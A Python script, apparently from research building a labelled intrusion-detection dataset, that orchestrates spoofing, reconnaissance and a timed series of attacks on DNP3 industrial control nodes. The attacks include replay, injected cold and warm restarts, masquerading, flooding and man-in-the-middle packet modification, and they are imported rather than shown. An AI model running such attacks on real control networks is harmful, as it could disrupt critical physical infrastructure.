__author__ = 'Nicholas Rodofile'

from attack_functions import *

if __name__ == '__main__':
    local = "dataset/"

    log = []
    sub_log = []

    def timestamp_log(log_msg):
        log_item = str(datetime.now()) + " " +log_msg
        print log_item
        log.append(log_item)
        sub_log.append(log_item)


    def run_attack(_victim, _gateway, attack):
        timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " START")
        attack(_victim, _gateway)
        timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " END")

    def reconnaissance(gateway, victim, nodes, mitm):
        DNP3_nodes_found = []
        for n in nodes.keys():
            if nodes[n].status == "open":
                mitm.victim = nodes[n]
                mitm.init_spoofing()
                timestamp_log("reconnaissance" + " " + nodes[n].ip_address + " START")
                master = DNP3_Reconnaissance(nodes[n], dnp3_port)
                DNP = master.start()
                DNP3_nodes_found.append(DNP), "Address discovery"
                timestamp_log("reconnaissance" + " " + nodes[n].ip_address + " END")
            else:
                print n, "port closed"
            #scan_countdown(10)
        print "--------------- DNP3 Nodes Found ----------------"
        print "#################################################"
        if len(DNP3_nodes_found) == 0:
            print "No DNP3 Nodes"
        for n_d in DNP3_nodes_found:
            print n_d["IP"], ": Master:", n_d["master"], " Slave:", n_d["slave"]
        print "#################################################"

    replay_file = 'mitm/replay_20160225_1634.pcap'
    mst_replay_file = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'
    mst_replay_file2 = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'

    directory = local + str(datetime.now().strftime("%Y%m%d%H%M%S"))
    os.makedirs(directory)
    interfaces = {
        'attacker': "eth0",
        'master': "eth1",
        'slave': "eth2"
    }
    interface = interfaces['attacker']
    min_time = 5
    max_time = 5

    attack_list = [
        injection_replay,
        injection_replay_updater_ack,
        injection_FreezeObj,
        injection_ColdRestart,
        injection_WarmRestart,
        injection_push,
        master_hijacking_with_replay,
        master_hijacking_with_replay_flooding,
        slave_masquerading,
        master_masquerading,
        master_flooding,
        master_flooding_freeze,
        master_flooding_time,
        master_replay,
        master_replay_flooding,
        slave_replay,
        slave_masquerading_flooding,
        slave_masquerading_Object_Spoof_Binary,
        slave_masquerading_Object_Spoof_Counter,
        slave_masquerading_Object_Spoof_Binary_fuzz,
        slave_masquerading_Object_Spoof_Counter_fuzz,
        MITM_forwarding,
        MITM_hijack_injection,
        MITM_modification_length_overflow,
        MITM_modification_IMMED_FREEZE_NR,
        MITM_modification_BinaryStatus,
        MITM_modification_CounterStatus,
    ]

    gateway, victim, nodes = config_nodes_all(interface=interface, port="20000", init_nodes_func=init_dnp3_nodes)
    mitm = DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
    mitm.init_spoofing()


    count = 0
    udp = UDP_Server(gateway, 23, 0)
    udp_mask = Thread(target=udp.start)
    udp_mask.start()


    attack_class_dir = directory+"/"+"attackFramework"
    os.makedirs(attack_class_dir)

    experiment_name = "test"
    dataset_manager = DatasetManager(attack_class_dir, interfaces, experiment_name)
    dataset_manager.start()
    # Randomise time
    reconnaissance(gateway, victim, nodes, mitm)


    for attack in attack_list:
        sleep_time = (randint(min_time, max_time))
        attack_countdown(sleep_time * minute)
        run_attack(victim, gateway, attack)

    dataset_manager.stop()
    sub_log_file = attack_class_dir+"/Attack_script_log.log"
    file = open(sub_log_file, 'w')
    for l in sub_log:
        file.write(l + "\n")
    file.close()
    print "Sub-Log file:", sub_log_file
    sub_log = []
    UDP_SERVER_STOP = True
    udp_mask.join()
    log_file = directory+"/Attack_script_log.log"
    file = open(log_file, 'w')
    for l in log:
        file.write(l + "\n")
    file.close()

    print "Log file:", log_file

    quit()